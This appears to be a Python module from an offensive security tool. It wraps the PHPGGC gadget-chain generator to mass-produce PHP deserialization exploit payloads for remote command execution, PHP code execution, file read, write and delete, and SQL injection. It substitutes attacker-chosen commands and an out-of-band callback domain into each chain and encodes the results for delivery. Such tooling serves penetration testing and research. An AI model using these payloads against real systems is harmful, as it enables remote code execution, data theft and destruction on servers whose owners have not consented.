import os
import re
import logging
import urllib.parse
import base64
from .serializer import Serializer

class PHPGGC(Serializer):

    usage = 'PHPGGC: PHP Generic Gadget Chains'

    payloadFormats = {
        'RCE: Command' : ["'<system_command>'"],
        'RCE: Function Call': ["'<php_function>' '<system_command>'"],
        'RCE: PHP Code': ["'<code>'"],
        'File write': ["'<remote_file_to_write>' '<local_file>'"],
        'phpinfo()': [""],
        'File delete': ["'<remote_file_to_delete>'"],
        'File read': ["'<url>'", "'<remote_file_to_read>'"],
        'SQL injection': ["'<sql>'"],
        'RCE: eval(php://input)': [""],
    }

    unsafePayloads = [
        'File delete'
    ]

    def __init__(self, bin, chainOpts):
        self.phpggcOpts = chainOpts.phpggc_options
        super().__init__(bin, chainOpts)

    def chains(self):
        chainsOutput = self.exec("-l").split('\n')
        pattern = r"^(?P<name>[\w\/]+)\s{3,}(?P<version>[^\s].+[^\s])\s{3,}(?P<type>[^\s].+[^\s])\s{3,}(?P<vector>[\w:]+)\s+.*$"
        regex = re.compile(pattern)
        chains = []
        for line in chainsOutput:
            match = regex.search(line)
            if not match: 
                continue
            chain = match.groupdict()
            if chain['name'] == 'NAME': 
                continue

            if not chain['type'] in self.payloadFormats:
                logging.debug(f'Unsupported chain type {chain["type"]}')
                continue

            chains.append({
                'id': chain['name'].replace('/', ''),
                'name': chain['name'],
                'description': f"{chain['name']}: {chain['type']}",
                'type': chain['type'],
                'formats': self.payloadFormats[chain['type']],
                'unsafe': chain['type'] in self.unsafePayloads,
            })
        return chains
    
    def payload(self, chainName, chainArgs):
        return self.exec(f"{self.phpggcOpts} {chainName} {chainArgs}", rawResult=True)
    
    def generate(self, chains):

        if len(chains) == 0:
            return 0

        system_command = self.chainOpts.system_command
        interact_domain = self.chainOpts.interact_domain
        php_function = self.chainOpts.php_function
        php_code = self.getFileContentOrCode(self.chainOpts.php_code)
        remote_file_to_read = self.chainOpts.remote_file_to_read
        remote_file_to_write = self.chainOpts.remote_file_to_write
        remote_file_to_delete = self.chainOpts.remote_file_to_delete
        remote_content = self.getFileContentOrCode(self.chainOpts.remote_content) if self.chainOpts.remote_content is not None else php_code
        sql = self.chainOpts.sql

        logging.info(f"Interact domain: {interact_domain}")
        logging.info(f"System command: {system_command}")
        logging.info(f"PHP Functions: {php_function}")
        logging.info(f"PHP Code: {self.chainOpts.php_code}")
        logging.info(f"File read on server: {remote_file_to_read}")
        logging.info(f"File written on server: {remote_file_to_write}")
        logging.info(f"Content written on server: {remote_content}")
        logging.info(f"Remote file to delete (if unsafe): {remote_file_to_delete}")
        
        # create an empty file that will contain PHP file with the payload
        fp = self.createTemporaryFile(suffix='.php')
        if fp == None:
            return 0
        
        logging.info(f"Starting payload generation")
        count = 0
        for chain in chains:

            if chain['unsafe'] and not self.chainOpts.unsafe:
                logging.debug(f"[{chain['name']}] Skipping unsafe chain of '{chain['type']}'")
                continue

            # generate payload for each chain
            for format in chain['formats']:

                logging.info(f"[{chain['name']}] Generating payload of type '{chain['type']}'")

                if ('<url>' in format or '<domain>' in format) and not interact_domain:
                    logging.warning(f"[{chain['name']}] Skipping payload with format {format} because it requires an interact domain")
                    continue

                chain_system_command = system_command
                chain_system_command = chain_system_command.replace('%%chain_id%%', chain['id'])
                chain_system_command = chain_system_command.replace('%%domain%%', str(interact_domain))
                chain_system_command = chain_system_command.replace("'", "\\'")
                escaped_chain_system_command = chain_system_command.replace('"', '\\"')

                content = remote_content
                content = content.replace('%%system_command%%', chain_system_command)
                content = content.replace('%%php_function%%', php_function)
                content = content.replace('%%domain%%', str(interact_domain))
                content = content.replace('%%chain_id%%', chain['id'])

                chainArguments = format
                chainArguments = chainArguments.replace('<system_command>', chain_system_command)
                chainArguments = chainArguments.replace('<php_function>', php_function)
                chainArguments = chainArguments.replace('<code>', f'{php_function}("{escaped_chain_system_command}");')
                chainArguments = chainArguments.replace('<local_file>', fp.name)
                chainArguments = chainArguments.replace('<remote_file_to_read>', remote_file_to_read)
                chainArguments = chainArguments.replace('<remote_file_to_write>', remote_file_to_write.replace('%%ext%%', 'php'))
                chainArguments = chainArguments.replace('<remote_file_to_delete>', remote_file_to_delete)
                chainArguments = chainArguments.replace('<url>', f"https://{interact_domain}/{chain['id']}.php")
                chainArguments = chainArguments.replace('<sql>', sql.replace("'", "\\'"))

                with open(fp.name, mode='w') as ft:
                    ft.write(content)
                
                result = self.payload(chain['name'], chainArguments)
                if result.returncode != 0:
                    logging.error(f"[{chain['name']}] Failed to create payload")
                    if result.stderr != b'':
                        logging.error(result.stderr.decode('ascii'))
                    if result.stdout != b'':
                        logging.error(result.stdout.decode('ascii'))
                    continue

                payload = result.stdout
                
                logging.debug(f"[{chain['name']}] Payload generated with {len(payload)} bytes")

                if self.chainOpts.base64:
                    payload = base64.b64encode(payload)
                elif self.chainOpts.base64_urlsafe:
                    payload = base64.urlsafe_b64encode(payload)
                
                if self.chainOpts.url:
                    payload = urllib.parse.quote_plus(payload).encode('ascii')

                if len(chain['formats']) > 1:
                    chainUniqueId = f"{chain['id']}_{chain['formats'].index(format)}"
                else:
                    chainUniqueId = chain['id']
                self.output(chainUniqueId, payload+b"\n")
                count = count + 1    
            
        # cleanup temp file
        if os.path.exists(fp.name):
            logging.debug(f"Removing temporary file {fp.name}")
            os.remove(fp.name)

        return count